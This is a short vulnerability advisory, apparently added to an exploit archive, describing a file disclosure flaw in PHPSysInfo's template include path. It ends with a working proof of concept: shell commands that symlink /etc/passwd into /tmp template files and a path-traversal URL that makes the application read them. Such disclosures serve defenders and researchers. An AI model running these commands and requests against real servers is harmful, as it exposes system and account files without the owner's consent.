@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/7275/info
+
+PHPSysInfo has been reported to be vulnerable to a file disclosure issue.
+
+Local users may be capable of influencing the include path for several PHPSysinfo template files. If the malicious template file is symlinked to a web server readable file, the contents of the linked file may be disclosed to the attacker.
+
+This attack may lead to confidential or sensitive information disclosure, which could be used to launch other attacks. 
+
+~$ ln -s /etc/passwd /tmp/form.tpl
+~$ ln -s /etc/passwd /tmp/box.tpl
+
+http://www.example.com/index.php?template=../../../../tmp 
